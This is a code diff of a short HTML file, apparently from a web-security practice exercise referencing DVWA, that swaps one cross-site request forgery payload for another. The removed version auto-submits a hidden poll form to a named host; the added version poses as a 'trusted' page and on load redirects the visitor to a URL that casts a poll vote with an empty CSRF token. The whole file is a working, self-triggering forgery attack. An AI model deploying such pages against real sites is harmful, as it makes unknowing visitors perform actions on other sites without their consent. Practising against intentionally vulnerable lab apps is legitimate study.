@@ -1,10 +1,13 @@
-<!-- csrf_poll_attack.html -->
-<form action="https://mutil.ddlr.org/index.php?page=user-poll.php" method="POST">
-  <input type="hidden" name="poll_question" value="CSRF desde GitHub" />
-  <input type="hidden" name="poll_choice" value="Shur3 😎" />
-  <input type="submit" value="Enviar CSRF" />
-</form>
-
-<script>
-  document.forms[0].submit();
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sitio "Confiable"</title>
+</head>
+<body>
+    <h1>Este es un sitio confiable...</h1>
+    <script>
+        // Primera redirección (ataque CSRF en DVWA)
+        window.location.replace('https://mutil.ddlr.org/index.php?page=user-poll.php&csrf-token=&choice=Shur3%20😎&initials=&user-poll-php-submit-button=Submit+Vote');
+    </script>
+</body>
+</html>
